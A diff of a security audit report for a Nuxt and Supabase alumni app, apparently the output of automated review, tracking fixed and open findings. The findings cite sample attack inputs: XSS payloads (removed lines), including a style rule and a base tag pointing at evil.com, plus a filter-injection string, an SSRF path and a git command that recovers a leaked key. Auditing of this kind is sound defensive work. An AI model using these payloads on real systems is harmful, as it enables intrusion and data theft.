@@ -1,322 +1,156 @@
 # Security Audit Report
 
-**Date:** 2026-04-27 (updated)
+**Date:** 2026-04-28
 **Scope:** Full application — Nuxt 4 + Supabase + PrimeVue + Resend email
-**Branch:** `refactor/image-integration`
+**Branch:** `feature/email-integration`
+**Auditors:** Automated multi-layer review (server routes, middleware/auth, XSS/client, RLS/migrations, config/infrastructure)
+**Last updated:** 2026-04-28 — C-2 (XSS/DOMPurify) and C-3 (search_path) fixed
 
 ---
 
 ## Summary
 
-| Severity | Count |
-|----------|-------|
-| Critical | 4 → 3 fixed |
-| High | 3 → 1 fixed |
-| Medium | 7 |
-| Low / Informational | 4 |
-| Passing | 8 |
+| Severity | Count | Fixed | Open |
+|----------|-------|-------|------|
+| Critical | 7 | 6 | 1 |
+| High | 10 | 1 | 9 |
+| Medium | 16 | 1 | 15 |
+| Low / Informational | 12 | 1 | 11 |
+| **Total** | **45** | **9** | **36** |
+| Passing checks | 13 | — | — |
+
+---
+
+## Previously Fixed (verified this audit)
+
+### FIXED-1. ~~Admin verification uses client-provided ID — privilege escalation~~ (was Critical #1)
+
+All 4 admin server routes (`approve.post.ts`, `reject.post.ts`, `suspend.post.ts`, `admin-create-member.post.ts`) now use `serverSupabaseClient(event)` + `getUser()` to extract the caller's identity from the server-side session. Client-provided `adminId` parameters removed.
+
+### FIXED-2. ~~Change-password accepted client-provided userId — account takeover~~ (was Critical #2)
+
+`change-password.post.ts` now uses `serverSupabaseClient(event)` + `getUser()`. The `userId` body parameter was removed.
+
+### FIXED-3. ~~Registration — no input validation, no rate limiting~~ (was Critical #4)
+
+Zod schema validation with email format + lowercase normalization, password 8–128 chars, full_name 2–100 chars, batch_year integer, phone regex, student_id max 50. Rate limiting at 1 request/60s per email. Generic error messages prevent enumeration.
+
+### FIXED-4. ~~RLS allows alumni to self-approve~~ (was High #5)
+
+Migration `014_protect_profile_sensitive_fields.sql` adds a `BEFORE UPDATE` trigger that reverts changes to `status`, `approved_by`, `approved_at`, `is_verified` for non-admin, non-service-role users.
+
+### FIXED-5. ~~Email case normalization in registration~~ (was Medium #8, partially fixed)
+
+Registration normalizes email to lowercase via Zod `.transform(v => v.toLowerCase().trim())`. DB-level case-insensitive unique index still recommended (see M-8).
+
+### FIXED-6. ~~Orphaned user cleanup swallows errors in register~~ (was Low #17, partially fixed)
+
+`register.post.ts` now logs cleanup failures. However, `admin-create-member.post.ts` still silently swallows (see L-4).
+
+### FIXED-7. ~~Stored XSS — unsanitized `v-html` rendering~~ (was Critical C-2)
+
+**Status:** Fixed. `isomorphic-dompurify` installed. New `useSanitize` composable provides `sanitizeHTML()` with a strict allowlist. All 5 `v-html` bindings in `news/[slug].vue`, `jobs/[slug].vue`, and `events/[slug].vue` now use render-time sanitization. The `RichTextEditor.vue` custom blocklist sanitizer was replaced with DOMPurify. HTML injection in `insertLink()` and `insertImage()` fixed via attribute escaping. Content is now sanitized on mount, watch, input, and blur.
+
+### FIXED-8. ~~No `search_path` on SECURITY DEFINER functions~~ (was Critical C-3)
+
+**Status:** Fixed via migration `015_secure_search_path.sql`. All 9 `SECURITY DEFINER` functions now have `SET search_path = public`: `is_admin_user()`, `is_super_admin()`, `is_active_alumni()`, `update_event_rsvp_count()`, `update_feed_reaction_count()`, `update_feed_comment_count()`, `update_batch_member_count()`, `generate_unique_slug()`, `protect_sensitive_profile_fields()`.
 
 ---
 
 ## Critical
 
-### 1. ~~Admin verification uses client-provided ID — privilege escalation~~ FIXED
+### C-1. Supabase service role key committed to git history — NEW
 
-**Status:** Fixed. All admin server routes now use `serverSupabaseClient(event)` + `getUser()` to extract the authenticated user's identity from the session cookie. Client-provided `adminId` / `admin_id` parameters have been removed from all request bodies and composable calls.
+**File:** `.env` (committed in initial commit `82f04ef`, removed in `23da6f7`)
 
-```ts
-const { ids, adminId } = body
-// ...
-const { data: adminCheck } = await adminSupabase
-  .from('admin_users')
-  .select('id')
-  .eq('id', adminId)  // Client-provided!
-  .eq('is_active', true)
-  .single()
-```
+The initial commit included `.env` with a real Supabase service role key (a JWT) and anon key for project `vrvweamohqaoepjigqiu`. The key was removed from tracking in a later commit but **remains in git history permanently**. Anyone who clones the repo can extract it via `git log --all -p -- .env`.
 
-**Attack:** Any authenticated user who knows (or guesses) a valid admin UUID can call these endpoints and impersonate that admin — approving members, rejecting applications, suspending accounts, or creating new members. Admin UUIDs could be discovered via network inspection or the directory.
+The current `.env` on disk contains credentials for a **second** project (`vzbylztcywktecrcobit`), which may also be at risk if the repo is shared.
 
-**Impact:** Complete privilege escalation. A regular member can perform any admin action.
-
-**Remediation:** Extract the authenticated user's identity from the Supabase auth session (cookie/header), not from the request body:
-
-```ts
-import { serverSupabaseUser } from '#supabase/server'
-
-export default defineEventHandler(async (event) => {
-  const user = await serverSupabaseUser(event)
-  if (!user?.id) throw createError({ statusCode: 401, statusMessage: 'Not authenticated' })
-
-  const adminSupabase = createClient(supabaseUrl, serviceKey)
-  const { data: adminCheck } = await adminSupabase
-    .from('admin_users')
-    .select('id')
-    .eq('id', user.id)  // From auth session, not body
-    .eq('is_active', true)
-    .single()
-  // ...
-})
-```
-
----
-
-### 2. ~~Change-password endpoint accepts client-provided userId — account takeover~~ FIXED
-
-**Status:** Fixed. The endpoint now uses `serverSupabaseClient(event)` + `getUser()` to identify the caller. The `userId` parameter has been removed from the request body. Users can only change their own password.
-
-The endpoint accepts `userId` from the request body and uses it to look up the target account:
-
-```ts
-const { currentPassword, newPassword, userId } = body
-// ...
-const { data: profile } = await adminSupabase
-  .from('alumni_profiles')
-  .select('email')
-  .eq('id', userId)  // Client-controlled
-  .single()
-```
-
-**Attack:** An attacker who knows another member's email and current password (e.g., from a credential breach) can change that member's password by providing their `userId`. The endpoint does verify the current password — but against the *target* user, not the *caller*. There's no check that the caller is the same person whose password is being changed.
-
-**Impact:** Account takeover if an attacker has any member's credentials.
-
-**Remediation:** Same as #1 — extract user identity from the auth session:
-
-```ts
-const user = await serverSupabaseUser(event)
-if (!user?.id) throw createError({ statusCode: 401, statusMessage: 'Not authenticated' })
-
-const { data: profile } = await adminSupabase
-  .from('alumni_profiles')
-  .select('email')
-  .eq('id', user.id)  // Always the authenticated user
-  .single()
-```
-
----
-
-### 3. XSS risk — incomplete sanitization on input, none on render
-
-The app has a custom rich text editor (`app/components/shared/RichTextEditor.vue`) with a built-in `sanitizeHtml()` function. This is a good start, but has two structural problems and several bypass gaps.
-
-**Structural problems:**
-
-1. **Sanitization only runs on blur in the editor** (line 175–185) — not when content is saved, and not when content is rendered on public pages. If malicious HTML reaches the database through any path (direct DB edit, API manipulation, future import feature), it renders unsanitized via `v-html`.
-
-2. **No render-time sanitization** — all 5 `v-html` bindings render raw database content:
-
-| File | Line | Binding |
-|------|------|---------|
-| `app/pages/news/[slug].vue` | 72 | `v-html="article.content"` |
-| `app/pages/jobs/[slug].vue` | 80 | `v-html="job.description"` |
-| `app/pages/jobs/[slug].vue` | 84 | `v-html="job.requirements"` |
-| `app/pages/jobs/[slug].vue` | 88 | `v-html="job.benefits"` |
-| `app/pages/events/[slug].vue` | 89 | `v-html="event.content"` |
-
-**Sanitizer bypass gaps** (`RichTextEditor.vue:134–153`):
-
-The current sanitizer uses a blocklist approach — it removes known-dangerous tags and attributes. This misses many vectors:
-
-| Vector | Status | Example |
-|--------|--------|---------|
-| `<script>`, `<iframe>`, `<object>`, `<embed>` | Blocked | — |
-| `onclick`, `onerror`, `onload`, `onmouseover`, `onmouseout`, `onfocus`, `onblur` | Blocked | — |
-| `javascript:` in `href` | Blocked | — |
-| `<svg onload="...">` | **NOT blocked** | `<svg onload="alert(1)">` |
-| `<svg><script>` (nested) | **NOT blocked** | `<svg><script>alert(1)</script></svg>` |
-| `<math>` with embedded handlers | **NOT blocked** | `<math><mi onclick="...">` |
-| 50+ event handlers beyond the 7 listed | **NOT blocked** | `onanimationstart`, `ontransitionend`, `onpointerover`, etc. |
-| `<a href="data:text/html,...">` | **NOT blocked** | Data URI HTML injection |
-| `<style>` injection | **NOT blocked** | `<style>*{background:url(//evil.com/steal?...)}</style>` |
-| `<base>` tag hijacking | **NOT blocked** | `<base href="//evil.com/">` redirects all relative URLs |
-| `<meta http-equiv="refresh">` | **NOT blocked** | Auto-redirect users |
-
-**Additional XSS vectors in RichTextEditor:**
-
-- **Alt text injection** (line ~360): `imageAlt.value` is interpolated unescaped into HTML: `` alt="${imageAlt.value}" ``. A value containing `"` breaks the attribute and injects arbitrary attributes.
-- **Link text injection** (line ~270): `linkText.value` is inserted as raw HTML inside an `<a>` tag, allowing nested HTML injection: `<img src=x onerror="alert(1)">`
-
-**Impact:** Stored XSS — attacker-controlled scripts run in authenticated user sessions, can steal tokens, impersonate users, or exfiltrate data.
-
-**Remediation (two-layer fix):**
-
-**Layer 1 — Replace custom sanitizer with DOMPurify in the editor:**
-
-```bash
-pnpm add dompurify
-pnpm add -D @types/dompurify
-```
-
-```ts
-import DOMPurify from 'dompurify'
-
-function sanitizeHtml(html: string): string {
-  return DOMPurify.sanitize(html, {
-    ALLOWED_TAGS: [
-      'b', 'i', 'em', 'strong', 'u', 's', 'a', 'p', 'br', 'span',
-      'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4',
-      'blockquote', 'code', 'pre', 'img', 'hr', 'div',
-    ],
-    ALLOWED_ATTR: [
-      'href', 'target', 'rel', 'src', 'alt', 'class', 'style',
-      'width', 'height', 'data-align',
-    ],
-    ALLOW_DATA_ATTR: false,
-  })
-}
-```
-
-**Layer 2 — Add render-time sanitization on every `v-html` page:**
-
-```ts
-// composables/useSanitize.ts
-import DOMPurify from 'dompurify'
-export function useSanitize() {
-  function sanitizeHTML(dirty: string | null | undefined): string {
-    if (!dirty) return ''
-    return DOMPurify.sanitize(dirty, { /* same config */ })
-  }
-  return { sanitizeHTML }
-}
-```
-
-Also escape alt text and link text in the editor:
-```ts
-const altAttr = imageAlt.value ? ` alt="${imageAlt.value.replace(/"/g, '&quot;')}"` : ' alt=""'
-```
-
----
-
-### 4. ~~Registration endpoint — no input validation, no rate limiting~~ FIXED
-
-**Status:** Fixed. The endpoint now uses Zod schema validation for all fields (email format + lowercase normalization, password 8–128 chars, full_name 2–100 chars trimmed, batch_year integer 1900–current year, phone regex, student_id max 50). Rate limiting added at 1 request per 60s per email. "Already registered" error replaced with generic "Registration failed" to prevent email enumeration. Orphaned auth user cleanup now logs errors.
-
-**File:** `server/api/auth/register.post.ts`
-
-| Issue | Detail |
-|-------|--------|
-| Email validation | Only truthy check — any string accepted |
-| Password strength | No server-side enforcement (frontend has 8-char check, but can be bypassed) |
-| batch_year | `Number(batch_year)` accepts negative numbers, decimals, year 9999, etc. |
-| phone | No format validation — any string stored |
-| student_id | No length or format constraint |
-| Rate limiting | None — unlimited registrations from a single IP |
-| Error leakage | "already registered" response reveals whether an email exists in the system |
-| email_confirm | Set to `true` (auto-confirms) — users register with fake/disposable emails |
-
-**Impact:** Registration spam/abuse, enumeration of existing email addresses, storage of malformed data.
+**Impact:** Full database compromise. The service role key bypasses all RLS policies with complete read/write/delete access to all tables, auth users, and storage.
 
 **Remediation:**
+1. **Immediately rotate** service role keys for both Supabase projects via Settings > API in the Supabase dashboard.
+2. Use `bfg-repo-cleaner` or `git filter-repo` to purge `.env` from history.
+3. Replace the real URL in `.env.example` with `https://your-project-ref.supabase.co`.
 
-```ts
-import { z } from 'zod'
+---
 
-const registrationSchema = z.object({
-  email: z.string().email().toLowerCase().max(255),
-  password: z.string().min(8).max(128),
-  full_name: z.string().min(2).max(100).trim(),
-  batch_year: z.number().int().min(1900).max(new Date().getFullYear()).optional(),
-  student_id: z.string().max(50).optional(),
-  phone: z.string().regex(/^\+?[\d\s\-()]{7,20}$/).optional(),
-})
-```
+### ~~C-2. Stored XSS — unsanitized `v-html` rendering~~ FIXED (see FIXED-7)
 
-Replace "already registered" error with a generic "Registration failed" to prevent enumeration. Add in-memory rate limiting (same pattern as `forgot-password.post.ts`).
+### ~~C-3. No `search_path` on SECURITY DEFINER functions — privilege escalation~~ FIXED (see FIXED-8)
 
 ---
 
 ## High
 
-### 5. ~~RLS allows alumni to self-approve — field-level escalation~~ FIXED
+### H-1. No CSRF / origin validation on any server route (still open from #6)
 
-**Status:** Fixed via migration `014_protect_profile_sensitive_fields.sql`. A `BEFORE UPDATE` trigger on `alumni_profiles` silently reverts changes to `status`, `approved_by`, `approved_at`, and `is_verified` for non-admin, non-service-role users. Service role (server API routes) and admin users are exempt.
+**Files:** All 7 routes under `server/api/`:
+- `server/api/auth/register.post.ts`
+- `server/api/auth/forgot-password.post.ts`
+- `server/api/auth/change-password.post.ts`
+- `server/api/auth/admin-create-member.post.ts`
+- `server/api/members/approve.post.ts`
+- `server/api/members/reject.post.ts`
+- `server/api/members/suspend.post.ts`
 
-```sql
-CREATE POLICY "Alumni update own profile" ON alumni_profiles FOR UPDATE
-  USING (auth.uid() = id) WITH CHECK (auth.uid() = id);
-```
+None check the `Origin` or `Referer` header.
 
-This policy allows an alumni to update ANY column on their own profile row, including `status`, `approved_by`, `approved_at`, and `is_verified`.
+**Impact:** A malicious site can submit POST requests on behalf of a logged-in user whose browser sends the Supabase session cookie automatically. This enables cross-site password changes, member approvals/rejections/suspensions, and registration spam.
 
-**Attack:** A pending member can self-approve via the Supabase client:
-
+**Remediation:** Add origin validation as Nitro server middleware:
 ```ts
-await supabase.from('alumni_profiles')
-  .update({ status: 'active', approved_by: 'any-uuid', approved_at: new Date().toISOString() })
-  .eq('id', myUserId)
-```
-
-**Impact:** Bypasses the entire admin approval flow.
-
-**Remediation:** Restrict updatable columns at the RLS level:
-
-```sql
-DROP POLICY "Alumni update own profile" ON alumni_profiles;
-CREATE POLICY "Alumni update own profile" ON alumni_profiles FOR UPDATE
-  USING (auth.uid() = id)
-  WITH CHECK (
-    auth.uid() = id
-    AND status IS NOT DISTINCT FROM (SELECT status FROM alumni_profiles WHERE id = auth.uid())
-    AND approved_by IS NOT DISTINCT FROM (SELECT approved_by FROM alumni_profiles WHERE id = auth.uid())
-    AND approved_at IS NOT DISTINCT FROM (SELECT approved_at FROM alumni_profiles WHERE id = auth.uid())
-    AND is_verified IS NOT DISTINCT FROM (SELECT is_verified FROM alumni_profiles WHERE id = auth.uid())
-  );
-```
-
-Or use a SECURITY DEFINER function that only allows updates to safe columns.
-
----
-
-### 6. No CSRF / origin validation on server routes
-
-**File:** All `server/api/**/*.post.ts` routes
-
-None of the POST endpoints validate the `Origin` or `Referer` header. A malicious site could submit forms to these endpoints on behalf of a visiting user.
-
-Routes affected: `register.post.ts`, `forgot-password.post.ts`, `change-password.post.ts`, `approve.post.ts`, `reject.post.ts`, `suspend.post.ts`, `admin-create-member.post.ts`.
-
-**Impact:** Cross-site registration abuse, password changes, admin actions.
-
-**Remediation:**
-
-```ts
-export default defineEventHandler(async (event) => {
-  const origin = getHeader(event, 'origin')
-  const config = useRuntimeConfig()
-  const allowed = [config.public.siteUrl]
-
-  if (!origin || !allowed.includes(origin)) {
-    throw createError({ statusCode: 403, statusMessage: 'Forbidden' })
+// server/middleware/csrf.ts
+export default defineEventHandler((event) => {
+  if (event.method === 'POST') {
+    const origin = getHeader(event, 'origin')
+    const allowed = [useRuntimeConfig().public.siteUrl]
+    if (!origin || !allowed.includes(origin)) {
+      throw createError({ statusCode: 403, statusMessage: 'Forbidden' })
+    }
   }
-  // ...
 })
 ```
 
 ---
 
-### 7. Missing explicit Supabase cookie configuration
+### H-2. CORS enabled globally without origin restriction (still open from #9)
 
-**File:** `nuxt.config.ts` (lines 51–58)
+**File:** `nuxt.config.ts` line 94
 
-No `cookieOptions` defined — relies on `@nuxtjs/supabase` module defaults. In production, cookies should be explicitly configured.
+```ts
+'/api/**': { cors: true },
+```
 
-| Attribute | Default | Recommended |
-|-----------|---------|-------------|
-| `secure` | varies | `true` (HTTPS only) |
-| `httpOnly` | varies | `true` (not accessible to JS) |
-| `sameSite` | `Lax` | `Lax` or `Strict` |
-| `maxAge` | module default | Explicit value (e.g., 7 days) |
+Sets `Access-Control-Allow-Origin: *` on all API routes. Combined with H-1, this is especially dangerous.
 
 **Remediation:**
+```ts
+'/api/**': {
+  cors: {
+    origin: [process.env.NUXT_PUBLIC_SITE_URL || 'http://localhost:3000'],
+    methods: ['GET', 'POST'],
+    credentials: true,
+  },
+},
+```
 
+---
+
+### H-3. Missing Supabase cookie security configuration (still open from #7)
+
+**File:** `nuxt.config.ts` lines 51–58
+
+No `cookieOptions` configured. In production, cookies may not be `secure`.
+
+**Remediation:**
 ```ts
 supabase: {
   redirect: false,
-  redirectOptions: { /* ... */ },
   cookieOptions: {
     maxAge: 60 * 60 * 24 * 7,
-    secure: true,
+    secure: process.env.NODE_ENV === 'production',
     sameSite: 'lax',
   },
 }
@@ -324,220 +158,457 @@ supabase: {
 
 ---
 
+### H-4. No security headers configured — NEW
+
+**File:** `nuxt.config.ts` — no server middleware, no Nitro headers config
+
+Missing all standard security headers:
+- **Content-Security-Policy** — no CSP means inline scripts unrestricted, amplifying XSS impact
+- **X-Content-Type-Options** — browsers may MIME-sniff uploaded files
+- **X-Frame-Options** — clickjacking possible
+- **Strict-Transport-Security** — no HSTS
+- **Referrer-Policy** — full referrer leaked
+- **Permissions-Policy** — unrestricted browser features
+
+**Remediation:** Add Nitro server middleware:
+```ts
+// server/middleware/security-headers.ts
+export default defineEventHandler((event) => {
+  setHeaders(event, {
+    'X-Content-Type-Options': 'nosniff',
+    'X-Frame-Options': 'DENY',
+    'X-XSS-Protection': '0',
+    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+    'Referrer-Policy': 'strict-origin-when-cross-origin',
+    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
+  })
+})
+```
+
+---
+
+### H-5. SWR caching on auth-protected routes — data leakage — NEW
+
+**File:** `nuxt.config.ts` lines 91–93
+
+```ts
+'/events/**': { swr: 900 },
+'/jobs/**': { swr: 1800 },
+```
+
+Event and job detail pages have `middleware: 'member-auth'`. SWR caching at the Nitro layer may cache fully rendered HTML of authenticated pages and serve them to unauthenticated users (or serve one user's response to another). The middleware runs at the Vue layer but SWR caches at the server/CDN layer **before** Vue routing.
+
+**Impact:** Member-only event/job content served to unauthenticated visitors from cache.
+
+**Remediation:** Remove SWR from auth-protected routes, or split public/member routes.
+
+---
+
+### H-6. `is_admin_user()` grants editor role full admin write access — NEW
+
+**File:** `supabase/migrations/002_rls_policies.sql` lines 10–22
+
+```sql
+CREATE OR REPLACE FUNCTION is_admin_user()
+RETURNS BOOLEAN AS $$
+  ...
+  RETURN user_role IN ('admin', 'editor');
+$$
+```
+
+The `editor` role gets identical write access to `admin` via `"Admin manage ..."` `FOR ALL` policies on every table. An editor can: delete any alumni profile, modify any event/article/job, write to `app_config` (changing branding), write to `audit_log`, manage all storage objects.
+
+**Impact:** Over-privileged editor role. An editor account compromise = full admin compromise.
+
+**Remediation:** Split into `is_admin_user()` (admin only) and `is_admin_or_editor()` for content tables. Restrict `app_config`, `alumni_profiles` management, and `audit_log` to admin-only.
+
+---
+
+### H-7. `protect_sensitive_profile_fields()` trigger bypass via NULL `auth.uid()` — NEW
+
+**File:** `supabase/migrations/014_protect_profile_sensitive_fields.sql` lines 7–9
+
+```sql
+IF auth.uid() IS NULL THEN
+    RETURN NEW;
+END IF;
+```
+
+The function assumes `auth.uid() IS NULL` means "service role". But `auth.uid()` is also `NULL` for unauthenticated requests (anon key with no JWT). If RLS is ever accidentally disabled, or a permissive policy added, this trigger allows anonymous users to set `status`, `approved_by`, `approved_at`, and `is_verified`.
+
+**Impact:** Defense-in-depth failure. Currently mitigated by RLS UPDATE policy, but fragile.
+
+**Remediation:**
+```sql
+IF current_setting('request.jwt.claims', true)::json->>'role' = 'service_role' THEN
+    RETURN NEW;
+END IF;
+```
+
+---
+
+### H-8. RLS leaks all profile columns to active alumni — privacy violation — NEW
+
+**File:** `supabase/migrations/005_member_only_rls.sql` lines 24–25
+
+```sql
+CREATE POLICY "Active alumni read directory" ON alumni_profiles FOR SELECT
+  USING (status = 'active' AND is_active_alumni());
+```
+
+Any active alumni can read ALL columns of every active profile — including `email`, `phone`, `date_of_birth`, `student_id` — regardless of privacy flags (`show_email`, `show_phone`, `show_dob`). The composable `.select()` limits columns, but a malicious user can query the Supabase API directly.
+
+**Impact:** PII exposure. Privacy flags are decorative, not enforced.
+
+**Remediation:** Create a database view that respects privacy flags and grant SELECT on the view, or use a server API proxy that enforces column filtering.
+
+---
+
+### H-9. Feed posts: alumni can modify admin-only fields — NEW
+
+**File:** `supabase/migrations/002_rls_policies.sql` lines 256–258
+
+```sql
+CREATE POLICY "Active alumni update own posts" ON feed_posts FOR UPDATE
+  USING (auth.uid() = author_id AND is_active_alumni())
+  WITH CHECK (auth.uid() = author_id);
+```
+
+Alumni can UPDATE any column on their own posts, including `is_pinned` (admin-only), `status` (can revert `removed` back to `published` after moderation), `removed_by`, and `removal_reason`.
+
+**Impact:** Bypasses admin moderation. A member can un-remove flagged content and self-pin posts.
+
+**Remediation:** Add a `BEFORE UPDATE` trigger (like migration 014) to protect `is_pinned`, `status`, `removed_by`, `removal_reason` on feed posts.
+
+---
+
 ## Medium
 
-### 8. ~~Email case normalization inconsistency~~ PARTIALLY FIXED
+### M-1. `admin-create-member.post.ts` — no input validation — NEW
 
-**Status:** Registration now normalizes email to lowercase via Zod `.transform(v => v.toLowerCase().trim())`. The case-insensitive unique index on the database is still recommended to enforce this at the DB level.
+**File:** `server/api/auth/admin-create-member.post.ts` lines 6–8
 
-**Files:** `server/api/auth/register.post.ts` vs `server/api/auth/forgot-password.post.ts`
+Only checks `!email || !full_name`. No email format validation, no length limits, no `batch_year` type check, no `status` whitelist (any value other than `'pending'` becomes `'active'`).
 
-Registration stores emails as provided (no normalization), while forgot-password normalizes to lowercase before querying:
+**Remediation:** Add Zod validation matching the registration schema.
+
+---
+
+### M-2. Error messages leak Supabase internal details — NEW
+
+**Files:**
+- `server/api/members/approve.post.ts` line 50: `statusMessage: updateError.message`
+- `server/api/members/reject.post.ts` line 52: `statusMessage: updateError.message`
+- `server/api/members/suspend.post.ts` line 52: `statusMessage: updateError.message`
+- `server/api/auth/admin-create-member.post.ts` line 50: `statusMessage: inviteError.message`
+
+Raw Supabase/PostgreSQL error messages passed to client, revealing table names, column names, constraint names.
+
+**Remediation:** Log server-side, return generic message: `throw createError({ statusCode: 500, statusMessage: 'Operation failed' })`
+
+---
+
+### M-3. PostgREST filter injection via unescaped search input — NEW
+
+**Files:**
+- `app/composables/useMembers.ts` lines 35, 71
+- `app/composables/useJobs.ts` lines 41, 74
+- `app/composables/useEvents.ts` line 46
+- `app/composables/useNews.ts` line 36
 
 ```ts
-// register.post.ts — stored as-is
-.insert({ email, ... })
-
-// forgot-password.post.ts — normalized
-const normalizedEmail = email.toLowerCase().trim()
-.eq('email', normalizedEmail)
+query = query.or(`full_name.ilike.%${filters.search}%,display_name.ilike.%${filters.search}%`)
 ```
 
-**Impact:** If a user registers with `John@Example.com`, the forgot-password query for `john@example.com` won't find them (PostgreSQL string comparison is case-sensitive by default).
+User search input interpolated directly into PostgREST filter strings. Characters like `,`, `.`, `(`, `)` can manipulate filter syntax (e.g., `%,email.eq.admin@test.com` injects additional conditions). Not SQL injection (PostgREST parameterizes), but can probe hidden columns.
 
-**Remediation:** Normalize email to lowercase in the registration route:
-
+**Remediation:**
 ```ts
-const normalizedEmail = email.toLowerCase().trim()
+const safeTerm = filters.search.replace(/[,.()]/g, '')
 ```
 
-And add a migration for a case-insensitive unique index:
+---
 
+### M-4. `change-password.post.ts` — no rate limiting — NEW
+
+**File:** `server/api/auth/change-password.post.ts`
+
+No rate limiting. An attacker with a compromised session can brute-force current passwords. No max password length (only min 8).
+
+**Remediation:** Add rate limiting (5 attempts/minute per user). Add max password length (128).
+
+---
+
+### M-5. `change-password.post.ts` — `signInWithPassword` creates dangling sessions — NEW
+
+**File:** `server/api/auth/change-password.post.ts` lines 43–49
+
+Uses the admin Supabase client to `signInWithPassword` for password verification, creating session tokens that are never cleaned up. Could interfere with Supabase's built-in auth rate limits.
+
+**Remediation:** Add `adminSupabase.auth.signOut()` after verification, or use an alternative verification method.
+
+---
+
+### M-6. `approve.post.ts` — no validation on `ids` array — NEW
+
+**File:** `server/api/members/approve.post.ts` lines 6–9
+
+No UUID format validation, no maximum array length, no type checking on array items. Could mass-approve thousands of UUIDs in one request.
+
+**Remediation:**
+```ts
+const schema = z.object({ ids: z.array(z.string().uuid()).min(1).max(50) })
+```
+
+---
+
+### M-7. `reject.post.ts` and `suspend.post.ts` — no UUID validation — NEW
+
+**Files:** `server/api/members/reject.post.ts` line 6, `server/api/members/suspend.post.ts` line 6
+
+Only truthy check on `id`. Any string passes.
+
+---
+
+### M-8. Email case-insensitive index still missing at DB level (partially fixed from #8)
+
+Registration normalizes email to lowercase, but no database constraint enforces this. A direct DB insert with mixed-case email would bypass normalization.
+
+**Remediation:**
 ```sql
 CREATE UNIQUE INDEX alumni_profiles_email_lower ON alumni_profiles (LOWER(email));
 ```
 
 ---
 
-### 9. CORS enabled globally without origin restriction
+### M-9. User-controlled URLs in `href` — `javascript:` protocol risk — NEW
 
-**File:** `nuxt.config.ts` (line 92)
+**Files:**
+- `app/pages/jobs/[slug].vue` lines 41, 61 (`company_website`, `apply_url`)
+- `app/components/member/MemberCard.vue` lines 87, 97, 107 (`portfolio_url`, `linkedin_url`, `facebook_url`)
+- `app/pages/profile/index.vue` lines 512, 592 (`edu.url`, `work.url`)
+- `app/pages/admin/members/[id].vue` line 602 (`link.url`)
 
-```ts
-routeRules: {
-  '/api/**': { cors: true },
-}
-```
+Database-stored URLs rendered in `<a :href>` without protocol validation. Members control their own social link/portfolio URLs. A `javascript:alert(1)` URL would execute on click.
 
-This enables CORS for ALL API routes without specifying allowed origins, methods, or headers.
+**Remediation:** Validate all user-supplied URLs start with `http://` or `https://` before rendering.
 
-**Impact:** Any website can make cross-origin requests to all API endpoints.
+---
+
+### M-10. `@nuxt/image` — no domain restrictions (SSRF) — NEW
+
+**File:** `nuxt.config.ts` — `@nuxt/image` registered with no `domains` config
+
+The image optimization proxy (`/_ipx/`) can fetch from any domain, enabling SSRF: `/_ipx/w_100/https://internal-service:8080/admin`.
 
 **Remediation:**
-
 ```ts
-routeRules: {
-  '/api/**': {
-    cors: {
-      origin: ['https://yourdomain.com'],
-      methods: ['GET', 'POST'],
-      credentials: true,
-    },
-  },
+image: {
+  domains: ['your-supabase-project.supabase.co'],
 }
 ```
 
 ---
 
-### 10. Pages accessible without middleware (RLS-only protection)
+### M-11. Reset-password page uses `getSession()` instead of `getUser()` — NEW
 
-These pages query member-restricted tables but have no route middleware. Supabase RLS correctly blocks data access for unauthenticated users, so they see empty lists — but there is no redirect to login.
-
-| Page | Current protection | Recommendation |
-|------|--------------------|----------------|
-| `app/pages/news/index.vue` | RLS only | Add `member-auth` middleware |
-| `app/pages/jobs/index.vue` | RLS only | Add `member-auth` middleware |
-| `app/pages/events/index.vue` | RLS only | Add `member-auth` middleware |
-
-**Note:** Migration 005 changed event RLS to require `is_active_alumni()`, meaning unauthenticated users see nothing. Either add middleware or revert the RLS policy to allow public read of published events.
-
----
-
-### 11. Client-side mutations lack input length / format validation
-
-Composable functions accept user input and pass it to Supabase without length caps.
-
-| File | Function | Issue |
-|------|----------|-------|
-| `app/composables/useFeed.ts` | `createPost()` | No content length limit |
-| `app/composables/useFeed.ts` | `addComment()` | No content length limit |
-| `app/composables/useMembers.ts` | `fetchDirectory()` | Search string unbounded |
-| `app/composables/useNews.ts` | `fetchArticles()` | Search string unbounded |
-| `app/composables/useJobs.ts` | `fetchJobs()` | Search string unbounded |
-
-**Note:** Supabase PostgREST parameterizes all queries, so this is not an injection risk — it's an abuse/DoS concern from oversized payloads.
-
----
-
-### 12. Middleware error handling gaps
-
-**Files:** `app/middleware/member-auth.ts`, `app/middleware/admin-auth.ts`
-
-If the Supabase query fails (network error, Supabase outage), `data` is null. The current code does not distinguish "query failed" from "user not found":
+**File:** `app/pages/auth/reset-password.vue` line 24
 
 ```ts
-const { data } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()
-if (!data) return navigateTo('/login')  // Both "not found" and "query error"
+const { data: { session } } = await supabase.auth.getSession()
 ```
 
-**Impact:** On Supabase outage, users are silently redirected to login instead of seeing a service error. No error logging.
+`getSession()` reads from local storage without server-side JWT verification. Per Supabase docs, `getUser()` should be used for security-sensitive operations. An expired/tampered local session would still show the password reset form.
 
-**Remediation:**
-
-```ts
-const { data, error } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()
-if (error || !data) {
-  console.error('Auth middleware: profile query failed', error)
-  return navigateTo('/login')
-}
-```
+**Remediation:** Replace with `supabase.auth.getUser()`.
 
 ---
 
-### 13. File upload MIME type validation is client-side only
+### M-12. Homepage fetches member-only data without auth — NEW
 
-**File:** `app/composables/useImageUpload.ts`
+**File:** `app/pages/index.vue` lines 22–31
 
-File type is checked against `file.type`, which is client-controlled and can be spoofed. No server-side file type validation exists — Supabase Storage stores whatever it receives.
+Homepage (public, pre-rendered) calls `fetchEvents()` and `fetchJobs()`, but migration 005 changed RLS to require `is_active_alumni()`. Unauthenticated visitors see empty arrays. Pre-render at build time runs without auth, producing empty sections.
 
-**Impact:** An attacker could upload non-image files (HTML, SVG with scripts, etc.) to image buckets. If these are served with incorrect Content-Type headers, they could execute scripts.
-
-**Remediation:** Add Supabase Storage bucket-level file type restrictions via the dashboard, or add server-side validation using magic bytes.
+**Remediation:** Create separate public RLS policies for limited event/job data, or remove these sections from the homepage, or use a server API route with service role.
 
 ---
 
-### 14. `redirect: false` in Supabase config — developer risk
+### M-13. File upload MIME type validation is client-side only (still open from #13)
 
